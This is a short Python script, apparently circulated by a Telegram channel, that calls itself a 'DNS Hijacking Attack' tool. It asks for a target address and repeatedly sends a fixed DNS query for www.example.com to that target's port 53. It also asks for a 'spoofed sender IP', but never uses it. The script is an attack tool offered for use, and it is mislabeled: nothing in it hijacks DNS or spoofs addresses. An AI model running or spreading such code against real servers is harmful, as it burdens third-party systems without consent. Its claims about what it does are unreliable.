import socket
import time

def dns_hijacking_attack():
    def send_dns_query(destination, query_type, interval, sender_ip):
        def send_packet(destination, port, payload):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(payload, (destination, port))
                print("\033[1;32mDNS query sent to {}\033[0m".format(destination))
            except Exception as e:
                print("\033[1;31mError sending DNS query to {}: {}\033[0m".format(destination, e))
            finally:
                sock.close()

        print("\033[1;32mDNS Hijacking Attack\nby t.me/VikingTERMINAL\033[0m")
        port = 53
        count = 0

        while True:
            try:
                payload = bytearray([0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                     0x03, 0x77, 0x77, 0x77, 0x06, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65,
                                     0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01])
                send_packet(destination, port, payload)
                count += 1
                if count % 50 == 0:
                    print("\033[1;34m----> 50 queries sent <----\033[0m")
                time.sleep(interval)
            except KeyboardInterrupt:
                print("\033[1;31mAttack interrupted.\033[0m")
                break

    print("\033[92mThanks for using this tool. Follow me on t.me/VikingTERMINAL for more utilities\033[0m")
    print("\033[1;31m┈┈┈╲┈┈┈┈╱")
    print("\033[1;31m┈┈┈╱▔▔▔▔╲")
    print("\033[1;31m┈┈┃┈▇┈┈▇┈┃")
    print("\033[1;31m╭╮┣━━━━━━┫╭╮")
    print("\033[1;31m┃┃┃┈┈┈┈┈┈┃┃┃")
    print("\033[1;31m╰╯┃┈┈┈┈┈┈┃╰╯")
    print("\033[1;31m┈┈╰┓┏━━┓┏╯")
    print("\033[1;31m┈┈┈╰╯┈┈╰╯")

    destination = input("\033[1;35mEnter the IP address or domain to attack: \033[0m")
    interval = float(input("\033[1;35mEnter the interval between queries (in seconds): \033[0m"))
    sender_ip = input("\033[1;35mEnter the spoofed sender IP address: \033[0m")
    send_dns_query(destination, "A", interval, sender_ip)

dns_hijacking_attack()